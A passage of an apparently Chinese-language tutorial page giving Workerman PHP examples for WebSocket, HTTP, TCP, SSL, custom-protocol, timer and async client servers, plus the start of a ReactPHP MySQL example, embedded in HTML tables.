cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 创建一个Websocket服务器</code></p>\n\n\t\t\t<p><code>$ws_worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>\"websocket://0.0.0.0:2346\"</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$ws_worker</code><code>-&gt;</code><code>count</code> <code>= 4;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 在新连接到来时发出</code></p>\n\n\t\t\t<p><code>$ws_worker</code><code>-&gt;onConnect = </code><code>function</code><code>(</code><code>$connection</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>echo</code> <code>\"New connection\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code> </code><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 接收数据时发出</code></p>\n\n\t\t\t<p><code>$ws_worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>// Send hello $data</code></p>\n\n\t\t\t<p><code>    </code><code>$connection</code><code>-&gt;send(</code><code>'hello '</code> <code>. </code><code>$data</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 连接关闭时发出</code></p>\n\n\t\t\t<p><code>$ws_worker</code><code>-&gt;onClose = </code><code>function</code><code>(</code><code>$connection</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>echo</code> <code>\"Connection closed\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 运行worker</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>http服务器</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// #### http worker ####</code></p>\n\n\t\t\t<p><code>$http_worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>\"http://0.0.0.0:2345\"</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$http_worker</code><code>-&gt;</code><code>count</code> <code>= 4;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 接收数据时发出</code></p>\n\n\t\t\t<p><code>$http_worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>//$_GET、$_POST、$_COOKIE、$_SESSION、$_SERVER、$_FILES都是可用的</code></p>\n\n\t\t\t<p><code>    </code><code>var_dump(</code><code>$_GET</code><code>, </code><code>$_POST</code><code>, </code><code>$_COOKIE</code><code>, </code><code>$_SESSION</code><code>, </code><code>$_SERVER</code><code>, </code><code>$_FILES</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>// 发送数据给客户端</code></p>\n\n\t\t\t<p><code>    </code><code>$connection</code><code>-&gt;send(</code><code>\"hello world \\n\"</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 运行所有workers</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>WebServer</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\WebServer;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// WebServer</code></p>\n\n\t\t\t<p><code>$web</code> <code>= </code><code>new</code> <code>WebServer(</code><code>\"http://0.0.0.0:80\"</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$web</code><code>-&gt;</code><code>count</code> <code>= 4;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$web</code><code>-&gt;addRoot(</code><code>'www.your_domain.com'</code><code>, </code><code>'/your/path/Web'</code><code>);</code></p>\n\n\t\t\t<p><code>$web</code><code>-&gt;addRoot(</code><code>'www.another_domain.com'</code><code>, </code><code>'/another/path/Web'</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>TCP服务器</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// #### 创建socket并监听1234端口 ####</code></p>\n\n\t\t\t<p><code>$tcp_worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>\"tcp://0.0.0.0:1234\"</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$tcp_worker</code><code>-&gt;</code><code>count</code> <code>= 4;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>//在新连接到来时发出</code></p>\n\n\t\t\t<p><code>$tcp_worker</code><code>-&gt;onConnect = </code><code>function</code><code>(</code><code>$connection</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>echo</code> <code>\"New Connection\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 接收数据时发出</code></p>\n\n\t\t\t<p><code>$tcp_worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>// 发送数据给客户端</code></p>\n\n\t\t\t<p><code>    </code><code>$connection</code><code>-&gt;send(</code><code>\"hello $data \\n\"</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 在新连接到来时发出</code></p>\n\n\t\t\t<p><code>$tcp_worker</code><code>-&gt;onClose = </code><code>function</code><code>(</code><code>$connection</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>echo</code> <code>\"Connection closed\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>启用SSL</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// SSL环境</code></p>\n\n\t\t\t<p><code>$context</code> <code>= </code><code>array</code><code>(</code></p>\n\n\t\t\t<p><code>    </code><code>'ssl'</code> <code>=&gt; </code><code>array</code><code>(</code></p>\n\n\t\t\t<p><code>        </code><code>'local_cert'</code>  <code>=&gt; </code><code>'/your/path/of/server.pem'</code><code>,</code></p>\n\n\t\t\t<p><code>        </code><code>'local_pk'</code>    <code>=&gt; </code><code>'/your/path/of/server.key'</code><code>,</code></p>\n\n\t\t\t<p><code>        </code><code>'verify_peer'</code> <code>=&gt; false,</code></p>\n\n\t\t\t<p><code>    </code><code>)</code></p>\n\n\t\t\t<p><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 创建一个带有ssl的Websocket服务器。</code></p>\n\n\t\t\t<p><code>$ws_worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>\"websocket://0.0.0.0:2346\"</code><code>, </code><code>$context</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 启用SSL。WebSocket+SSL意味着安全的WebSocket (wss://)。</code></p>\n\n\t\t\t<p><code>//类似的Https方法等等。</code></p>\n\n\t\t\t<p><code>$ws_worker</code><code>-&gt;transport = </code><code>'ssl'</code><code>;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$ws_worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>// 发送hello $data</code></p>\n\n\t\t\t<p><code>    </code><code>$connection</code><code>-&gt;send(</code><code>'hello '</code> <code>. </code><code>$data</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>自定义协议</strong></p>\n\n<p>Protocols/MyTextProtocol.php</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>namespace</code> <code>Protocols;</code></p>\n\n\t\t\t<p><code>/**</code></p>\n\n\t\t\t<p><code> </code><code>* 用户定义的协议</code></p>\n\n\t\t\t<p><code>*格式文本+“\\ n”</code></p>\n\n\t\t\t<p><code> </code><code>*/</code></p>\n\n\t\t\t<p><code>class</code> <code>MyTextProtocol</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>public</code> <code>static</code> <code>function</code> <code>input(</code><code>$recv_buffer</code><code>)</code></p>\n\n\t\t\t<p><code>    </code><code>{</code></p>\n\n\t\t\t<p><code>        </code><code>// 找到“\\n”第一个出现的位置</code></p>\n\n\t\t\t<p><code>        </code><code>$pos</code> <code>= </code><code>strpos</code><code>(</code><code>$recv_buffer</code><code>, </code><code>\"\\n\"</code><code>);</code></p>\n\n\t\t\t<p><code>        </code><code>// 不是一个完整的package。返回0，因为package的长度无法计算</code></p>\n\n\t\t\t<p><code>        </code><code>if</code><code>(</code><code>$pos</code> <code>=== false)</code></p>\n\n\t\t\t<p><code>        </code><code>{</code></p>\n\n\t\t\t<p><code>            </code><code>return</code> <code>0;</code></p>\n\n\t\t\t<p><code>        </code><code>}</code></p>\n\n\t\t\t<p><code>        </code><code>// 返回package的长度</code></p>\n\n\t\t\t<p><code>        </code><code>return</code> <code>$pos</code><code>+1;</code></p>\n\n\t\t\t<p><code>    </code><code>}</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>    </code><code>public</code> <code>static</code> <code>function</code> <code>decode(</code><code>$recv_buffer</code><code>)</code></p>\n\n\t\t\t<p><code>    </code><code>{</code></p>\n\n\t\t\t<p><code>        </code><code>return</code> <code>trim(</code><code>$recv_buffer</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>}</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>    </code><code>public</code> <code>static</code> <code>function</code> <code>encode(</code><code>$data</code><code>)</code></p>\n\n\t\t\t<p><code>    </code><code>{</code></p>\n\n\t\t\t<p><code>        </code><code>return</code> <code>$data</code><code>.</code><code>\"\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>}</code></p>\n\n\t\t\t<p><code>}</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// #### MyTextProtocol worker ####</code></p>\n\n\t\t\t<p><code>$text_worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>\"MyTextProtocol://0.0.0.0:5678\"</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$text_worker</code><code>-&gt;onConnect = </code><code>function</code><code>(</code><code>$connection</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>echo</code> <code>\"New connection\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$text_worker</code><code>-&gt;onMessage =  </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>// 发送数据给客户端</code></p>\n\n\t\t\t<p><code>    </code><code>$connection</code><code>-&gt;send(</code><code>\"hello world \\n\"</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$text_worker</code><code>-&gt;onClose = </code><code>function</code><code>(</code><code>$connection</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>echo</code> <code>\"Connection closed\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>// 运行所有workers</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>计时器</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Lib\\Timer;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$task</code> <code>= </code><code>new</code> <code>Worker();</code></p>\n\n\t\t\t<p><code>$task</code><code>-&gt;onWorkerStart = </code><code>function</code><code>(</code><code>$task</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>// 2.5秒</code></p>\n\n\t\t\t<p><code>    </code><code>$time_interval</code> <code>= 2.5; </code></p>\n\n\t\t\t<p><code>    </code><code>$timer_id</code> <code>= Timer::add(</code><code>$time_interval</code><code>, </code></p>\n\n\t\t\t<p><code>        </code><code>function</code><code>()</code></p>\n\n\t\t\t<p><code>        </code><code>{</code></p>\n\n\t\t\t<p><code>            </code><code>echo</code> <code>\"Timer run\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>        </code><code>}</code></p>\n\n\t\t\t<p><code>    </code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>//运行</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>AsyncTcpConnection（tcp / ws / text / frame等...）</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Connection\\AsyncTcpConnection;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker();</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onWorkerStart = </code><code>function</code><code>()</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>//客户端Websocket协议。</code></p>\n\n\t\t\t<p><code>    </code><code>$ws_connection</code> <code>= </code><code>new</code> <code>AsyncTcpConnection(</code><code>\"ws://echo.websocket.org:80\"</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>$ws_connection</code><code>-&gt;onConnect = </code><code>function</code><code>(</code><code>$connection</code><code>){</code></p>\n\n\t\t\t<p><code>        </code><code>$connection</code><code>-&gt;send(</code><code>'hello'</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>};</code></p>\n\n\t\t\t<p><code>    </code><code>$ws_connection</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>){</code></p>\n\n\t\t\t<p><code>        </code><code>echo</code> <code>\"recv: $data\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>};</code></p>\n\n\t\t\t<p><code>    </code><code>$ws_connection</code><code>-&gt;onError = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$code</code><code>, </code><code>$msg</code><code>){</code></p>\n\n\t\t\t<p><code>        </code><code>echo</code> <code>\"error: $msg\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>};</code></p>\n\n\t\t\t<p><code>    </code><code>$ws_connection</code><code>-&gt;onClose = </code><code>function</code><code>(</code><code>$connection</code><code>){</code></p>\n\n\t\t\t<p><code>        </code><code>echo</code> <code>\"connection closed\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>};</code></p>\n\n\t\t\t<p><code>    </code><code>$ws_connection</code><code>-&gt;connect();</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>ReactPHP的异步Mysql</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>composer </code><code>require</code> <code>react/mysql</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\n\t\t\t<p>32</p>\n\n\t\t\t<p>33</p>\n\n\t\t\t<p>34</p>\n\n\t\t\t<p>35</p>\n\n\t\t\t<p>36</p>\n\n\t\t\t<p>37</p>\n\n\t\t\t<p>38</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>'tcp://0.0.0.0:6161'</code><code>);</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onWorkerStart = </code><code>function</code><code>() {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code> <code>$mysql</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>$loop</code>  <code>= Worker::getEventLoop();</code></p>\n\n\t\t\t<p><code>    </code><code>$mysql</code> <code>= </code><code>new</code> <code>React\\MySQL\\Connection(</code><code>$loop</code><code>, </code><code>array</code><code>(</code></p>\n\n\t\t\t<p><code>        </code><code>'host'</code>   <code>=&gt; </code><code>'127.0.0.1'</code><code>,</code></p>\n\n\t\t\t<p><code>        </code><code>'dbname'</code> <code>=&gt; </code><code>'dbname'</code><code>,</code></p>\n\n\t\t\t<p><code>        </code><code>'user'</code>   <code>=&gt; </code><code>'user'</code><code>,</code></p>\n\n\t\t\t<p><code>        </code><code>'passwd'</code> <code>=&gt; </code><code>'passwd'</code><code>,</code></p>\n\n\t\t\t<p><code>    </code><code>));</code></p>\n\n\t\t\t<p><code>    </code><code>$mysql</code><code>-&gt;on(</code><code>'error'</code><code>, </code><code>function</code><code>(</code><code>$e</code><code>){</code></p>\n\n\t\t\t<p><code>        </code><code>echo</code> <code>$e</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>    </code><code>$mysql</code><code>-&gt;connect(</code><code>function</code> <code>(</code><code>$e</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>if</code><code>(</code><code>$e</code><code>) {</code></p>\n\n\t\t\t<p><code>            </code><code>echo</code> <code>$e</code><code>;</code></p>\n\n\t\t\t<p><code>        </code><code>} </code><code>else</code> <code>{</code></p>\n\n\t\t\t<p><code>            </code><code>echo</code> <code>\"connect success\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>        </code><code>}</code></p>\n\n\t\t\t<p><code>    